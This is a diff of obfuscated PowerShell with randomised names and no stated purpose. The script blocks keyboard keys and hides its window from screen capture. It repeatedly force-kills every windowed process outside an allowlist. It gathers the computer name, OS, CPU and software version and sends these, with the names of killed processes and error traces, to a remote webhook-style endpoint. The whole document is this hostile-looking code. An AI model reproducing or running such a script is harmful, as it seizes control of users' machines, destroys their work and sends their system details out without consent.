-$zFGTkNnhnsaG = @($QoDWGwnIXcSR, $EAIpLmeWYvXg, $sjHXtuIoxLdl, $aOldueYORtLb, $QQcPAfwkVdyE, $mbcTJjaUtQPS, $qDQfXzWmlKXg, $oFdVNFKloKxG, $dpUpYyQcGNIy, $JYEBsTgwwYeg, $rSeZDHwlOAud, $mfKFAeoIfaQh, $zokXhaNhrrlo)
-$NwwjyXrcwPxW = Get-Process | Where-Object {
+$SyOVeDnfxlvi = @($HItYxlduCTNN, $iGQKiukDIKHN, $IMfeCMQOHNhg, $FybHGuYuqhGG, $TRYZtnpPtQQi, $ajEVqOfWeBWs, $rGENwMebFLva, $RnTECaaSueyW, $KSbgBkzqotCR, $kJeGnhGhxrer, $PzCpXSxxbzut, $vRsyRTIyvvTc)
+$owPNXCcaXcqd = Get-Process | Where-Object {
 $_.MainWindowHandle -ne 0 -and
-$_.ProcessName -notin $zFGTkNnhnsaG -and
+$_.ProcessName -notmatch $rfryGmUbxmRj -and
+$_.ProcessName -notin $SyOVeDnfxlvi -and
 $_.Id -ne $PID
 }
-foreach ($p in $NwwjyXrcwPxW) {
-try { taskkill /F /PID $p.Id /T 2>&1 | Out-Null } catch {}
+foreach ($p in $owPNXCcaXcqd) {
+try { taskkill /F /PID $p.Id 2>&1 | Out-Null } catch {}
 }
 } catch { }
 try {
-Add-Type -TypeDefinition $JxnpRmLSmbhK
+Add-Type -TypeDefinition $UeCpSCvTqGPG
 } catch { }
 try { [KeyBlock]::BlockKeys() } catch { }
 try {
-$VSKhWEDdwUVx = (Get-Process -Id $iWuhBhwQSCDd.Id -ErrorAction SilentlyContinue).MainWindowHandle
-if ($VSKhWEDdwUVx -ne 0) {
-[KeyBlock]::SetWindowDisplayAffinity($VSKhWEDdwUVx, 0x00000011) | Out-Null
+$JYmTpqeffPdV = Get-Process -Name $rfryGmUbxmRj -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowHandle -ne 0 } | Select-Object -First 1
+if ($JYmTpqeffPdV) {
+[KeyBlock]::SetWindowDisplayAffinity($JYmTpqeffPdV.MainWindowHandle, 0x00000011) | Out-Null
 }
 } catch { }
-$sOcGMFAzUPXI = $env:COMPUTERNAME
-$komkexYhDFyL = $WIsDzUeMIuEl
-$mUxTrzUlHcnN = $WIsDzUeMIuEl
-try { $komkexYhDFyL = (Get-CimInstance -Class $gAxOiuCKnaMQ).Caption } catch {}
-try { $mUxTrzUlHcnN = (Get-CimInstance -Class $zoRhJAwmBwXk).Name } catch {}
-$HzRtQVsSOGcb = (Get-Item $JnnHpBvrDZbL -ErrorAction SilentlyContinue).VersionInfo.ProductVersion
-if (-not $HzRtQVsSOGcb) {
-$HzRtQVsSOGcb = (Get-Item $mRIRBtfcRqNV -ErrorAction SilentlyContinue).VersionInfo.ProductVersion
+$uohOSABwhJmK = $env:COMPUTERNAME
+$iIDezeWmQeJC = $NcuqaXbjcXmC
+$OsjvAGnyjbcj = $NcuqaXbjcXmC
+try { $iIDezeWmQeJC = (Get-CimInstance -Class $cITvRTQMUUPy).Caption } catch {}
+try { $OsjvAGnyjbcj = (Get-CimInstance -Class $kZkDqSgguhXl).Name } catch {}
+$ktecPhhMCYnu = (Get-Item $alYHoadobztA -ErrorAction SilentlyContinue).VersionInfo.ProductVersion
+if (-not $ktecPhhMCYnu) {
+$ktecPhhMCYnu = (Get-Item $yoBrcDLhPUjE -ErrorAction SilentlyContinue).VersionInfo.ProductVersion
 }
-if (-not $HzRtQVsSOGcb) { $HzRtQVsSOGcb = $WIsDzUeMIuEl }
-$hBPlrXFxsdlS = Get-Date -Format $RztzwkkTCCZe
-$wrBLiTXPUXqq = @(
-@{ name = $XFjhUrcDpDpr; value = $sOcGMFAzUPXI; inline = $true }
-@{ name = $jepFzxJxznWp; value = $QHpvKSwIGqeJ; inline = $true }
-@{ name = $oWpbPOZlnPWp; value = $komkexYhDFyL; inline = $false }
-@{ name = $fRppcdwYJDUu; value = $mUxTrzUlHcnN; inline = $false }
-@{ name = $AHsmYguiOXUS; value = $HzRtQVsSOGcb; inline = $true }
-@{ name = $eLbvZmhSEknC; value = $hBPlrXFxsdlS; inline = $true }
+if (-not $ktecPhhMCYnu) { $ktecPhhMCYnu = $NcuqaXbjcXmC }
+$GXtLtqdgGwXT = Get-Date -Format $WIeBZhFHMdYX
+$FeapVzqOtWgj = @(
+@{ name = $auAVukDQgacs; value = $uohOSABwhJmK; inline = $true }
+@{ name = $yIYwfAyRiWTz; value = $vAcGbXbaCJdu; inline = $true }
+@{ name = $USOVTQmODpwN; value = $iIDezeWmQeJC; inline = $false }
+@{ name = $KtGfTDwQhPCM; value = $OsjvAGnyjbcj; inline = $false }
+@{ name = $jkMIAnciQPYV; value = $ktecPhhMCYnu; inline = $true }
+@{ name = $HhMvIcrfFPqg; value = $GXtLtqdgGwXT; inline = $true }
 )
-IRKjsmBcEfqQ $xaKPlBlGRftx $mtjqNjggsZye 3066993 $wrBLiTXPUXqq
-while (-not $iWuhBhwQSCDd.HasExited) {
+EsbVjQcxeTWq $EVldgYZprkpt $VzCmztwSZKgZ 3066993 $FeapVzqOtWgj
+while ($true) {
+if ([KeyBlock]::ExitTriggered) {
+    $MZpdmqwRmyPZ = @(
+    @{ name = $auAVukDQgacs; value = $uohOSABwhJmK; inline = $true }
+    @{ name = $yIYwfAyRiWTz; value = $vAcGbXbaCJdu; inline = $true }
+    @{ name = $QkrGesrqvsHY; value = (Get-Date -Format $WIeBZhFHMdYX); inline = $false }
+    )
+    EsbVjQcxeTWq $EVldgYZprkpt $iqiyREIMJUFr 16753920 $MZpdmqwRmyPZ
+    break
+}
 try {
 for ($i = 0; $i -lt 50; $i++) {
 [System.Windows.Forms.Application]::DoEvents()
 Start-Sleep -Milliseconds 10
 }
-if (Get-Process -Name $aBaKGyzbqfXF -ErrorAction SilentlyContinue) {
-try { taskkill /F /IM $rnyyTIYIxzvI /T 2>&1 | Out-Null } catch {}
+if (Get-Process -Name $LPPQqHdngArU -ErrorAction SilentlyContinue) {
+try { taskkill /F /IM $eBpHyTQqjgjk 2>&1 | Out-Null } catch {}
 }
 try {
-$NwwjyXrcwPxW = Get-Process | Where-Object {
+$owPNXCcaXcqd = Get-Process | Where-Object {
 $_.MainWindowHandle -ne 0 -and
-$_.ProcessName -ne $QoDWGwnIXcSR -and
-$_.ProcessName -ne $mbcTJjaUtQPS -and
-$_.ProcessName -ne $qDQfXzWmlKXg -and
-$_.ProcessName -ne $oFdVNFKloKxG -and
-$_.ProcessName -ne $dpUpYyQcGNIy -and
-$_.ProcessName -ne $JYEBsTgwwYeg -and
-$_.ProcessName -ne $zokXhaNhrrlo -and
+$_.ProcessName -notmatch $rfryGmUbxmRj -and
+$_.ProcessName -ne $TRYZtnpPtQQi -and
+$_.ProcessName -ne $ajEVqOfWeBWs -and
+$_.ProcessName -ne $rGENwMebFLva -and
+$_.ProcessName -ne $RnTECaaSueyW -and
+$_.ProcessName -ne $KSbgBkzqotCR -and
+$_.ProcessName -ne $vRsyRTIyvvTc -and
+$_.ProcessName -ne $IMfeCMQOHNhg -and
+$_.ProcessName -ne $FybHGuYuqhGG -and
+$_.ProcessName -ne $iGQKiukDIKHN -and
+$_.ProcessName -ne $HItYxlduCTNN -and
+$_.ProcessName -ne $kJeGnhGhxrer -and
+$_.ProcessName -ne $PzCpXSxxbzut -and
 $_.Id -ne $PID
 }
-foreach ($p in $NwwjyXrcwPxW) {
-$eFNCCUJWiMon = @(
-@{ name = $XFjhUrcDpDpr; value = $sOcGMFAzUPXI; inline = $true }
-@{ name = $jepFzxJxznWp; value = $QHpvKSwIGqeJ; inline = $true }
-@{ name = $wbVpfPCguvXV; value = $p.ProcessName; inline = $false }
-@{ name = $YGjPlBeWSfGx; value = (Get-Date -Format $RztzwkkTCCZe); inline = $false }
+foreach ($p in $owPNXCcaXcqd) {
+$MZpdmqwRmyPZ = @(
+@{ name = $auAVukDQgacs; value = $uohOSABwhJmK; inline = $true }
+@{ name = $yIYwfAyRiWTz; value = $vAcGbXbaCJdu; inline = $true }
+@{ name = $GBohueJlIaFq; value = $p.ProcessName; inline = $false }
+@{ name = $QkrGesrqvsHY; value = (Get-Date -Format $WIeBZhFHMdYX); inline = $false }
 )
-IRKjsmBcEfqQ $xaKPlBlGRftx $biXqZcyfvfxs 15158332 $eFNCCUJWiMon
-try { taskkill /F /PID $p.Id /T 2>&1 | Out-Null } catch {}
+EsbVjQcxeTWq $EVldgYZprkpt $XYnCKOoXiaOO 15158332 $MZpdmqwRmyPZ
+try { taskkill /F /PID $p.Id 2>&1 | Out-Null } catch {}
 }
 } catch { }
-$BJjuzAhNmsmF = 0
-try { $BJjuzAhNmsmF = [KeyBlock]::GetForegroundWindow() } catch { }
-if ($BJjuzAhNmsmF -ne 0) {
-$MBzLDJnCEuqv = 0
-try { [KeyBlock]::GetWindowThreadProcessId($BJjuzAhNmsmF, [ref]$MBzLDJnCEuqv) | Out-Null } catch { }
-$WRPPXDPyDGvG = $null
-try { $WRPPXDPyDGvG = Get-Process -Id $MBzLDJnCEuqv -ErrorAction Stop } catch {}
-if ($WRPPXDPyDGvG -and
-($WRPPXDPyDGvG.ProcessName -ne $QoDWGwnIXcSR) -and
-($WRPPXDPyDGvG.ProcessName -ne $mbcTJjaUtQPS) -and
-($WRPPXDPyDGvG.ProcessName -ne $qDQfXzWmlKXg) -and
-($WRPPXDPyDGvG.ProcessName -ne $oFdVNFKloKxG) -and
-($WRPPXDPyDGvG.ProcessName -ne $dpUpYyQcGNIy) -and
-($WRPPXDPyDGvG.ProcessName -ne $JYEBsTgwwYeg) -and
-($WRPPXDPyDGvG.ProcessName -ne $zokXhaNhrrlo) -and
-($WRPPXDPyDGvG.Id -ne $PID)) {
-$RxoNNgaDAdTn = @(
-@{ name = $XFjhUrcDpDpr; value = $sOcGMFAzUPXI; inline = $true }
-@{ name = $jepFzxJxznWp; value = $QHpvKSwIGqeJ; inline = $true }
-@{ name = $UFUnJwIQDmZH; value = $WRPPXDPyDGvG.ProcessName; inline = $false }
-@{ name = $YGjPlBeWSfGx; value = (Get-Date -Format $RztzwkkTCCZe); inline = $false }
+$OvbHLtgZNbRX = 0
+try { $OvbHLtgZNbRX = [KeyBlock]::GetForegroundWindow() } catch { }
+if ($OvbHLtgZNbRX -ne 0) {
+$chqOjgeIKXcI = 0
+try { [KeyBlock]::GetWindowThreadProcessId($OvbHLtgZNbRX, [ref]$chqOjgeIKXcI) | Out-Null } catch { }
+$CqarcYgJItcO = $null
+try { $CqarcYgJItcO = Get-Process -Id $chqOjgeIKXcI -ErrorAction Stop } catch {}
+if ($CqarcYgJItcO -and
+($CqarcYgJItcO.ProcessName -notmatch $rfryGmUbxmRj) -and
+($CqarcYgJItcO.ProcessName -ne $TRYZtnpPtQQi) -and
+($CqarcYgJItcO.ProcessName -ne $ajEVqOfWeBWs) -and
+($CqarcYgJItcO.ProcessName -ne $rGENwMebFLva) -and
+($CqarcYgJItcO.ProcessName -ne $RnTECaaSueyW) -and
+($CqarcYgJItcO.ProcessName -ne $KSbgBkzqotCR) -and
+($CqarcYgJItcO.ProcessName -ne $vRsyRTIyvvTc) -and
+($CqarcYgJItcO.ProcessName -ne $IMfeCMQOHNhg) -and
+($CqarcYgJItcO.ProcessName -ne $FybHGuYuqhGG) -and
+($CqarcYgJItcO.ProcessName -ne $iGQKiukDIKHN) -and
+($CqarcYgJItcO.ProcessName -ne $HItYxlduCTNN) -and
+($CqarcYgJItcO.ProcessName -ne $kJeGnhGhxrer) -and
+($CqarcYgJItcO.ProcessName -ne $PzCpXSxxbzut) -and
+($CqarcYgJItcO.Id -ne $PID)) {
+$vqQJQmbkvyHo = @(
+@{ name = $auAVukDQgacs; value = $uohOSABwhJmK; inline = $true }
+@{ name = $yIYwfAyRiWTz; value = $vAcGbXbaCJdu; inline = $true }
+@{ name = $jryrvmCBalkH; value = $CqarcYgJItcO.ProcessName; inline = $false }
+@{ name = $QkrGesrqvsHY; value = (Get-Date -Format $WIeBZhFHMdYX); inline = $false }
 )
-IRKjsmBcEfqQ $xaKPlBlGRftx $YRQPvydhTNGI 15158332 $RxoNNgaDAdTn
-try { taskkill /F /PID $WRPPXDPyDGvG.Id /T 2>&1 | Out-Null } catch {}
+EsbVjQcxeTWq $EVldgYZprkpt $evsOLuiKgKql 15158332 $vqQJQmbkvyHo
+try { taskkill /F /PID $CqarcYgJItcO.Id 2>&1 | Out-Null } catch {}
 }
 }
 } catch { }
 }
 try { [KeyBlock]::UnblockKeys() } catch { }
-Start-Process $rnyyTIYIxzvI
+try { taskkill /F /IM $UsjGCqOsnAaY 2>&1 | Out-Null } catch { }
+Start-Process $eBpHyTQqjgjk
 } catch {
-$JgchlXirWzpj = @(
-@{ name = $XFjhUrcDpDpr; value = $env:COMPUTERNAME; inline = $true }
-@{ name = $JyAdHuIwpJVS; value = $_.Exception.Message; inline = $false }
-@{ name = $epJLoWcCHDJA; value = $_.ScriptStackTrace; inline = $false }
+$UBSFAXuEiwkA = @(
+@{ name = $auAVukDQgacs; value = $env:COMPUTERNAME; inline = $true }
+@{ name = $VrWNBnUWAvez; value = $_.Exception.Message; inline = $false }
+@{ name = $VqTChwtxtpcR; value = $_.ScriptStackTrace; inline = $false }
 )
-IRKjsmBcEfqQ $xaKPlBlGRftx $PLVtehsIpqHu 16711680 $JgchlXirWzpj
+EsbVjQcxeTWq $EVldgYZprkpt $gRDKOatFdLWd 16711680 $UBSFAXuEiwkA
 }
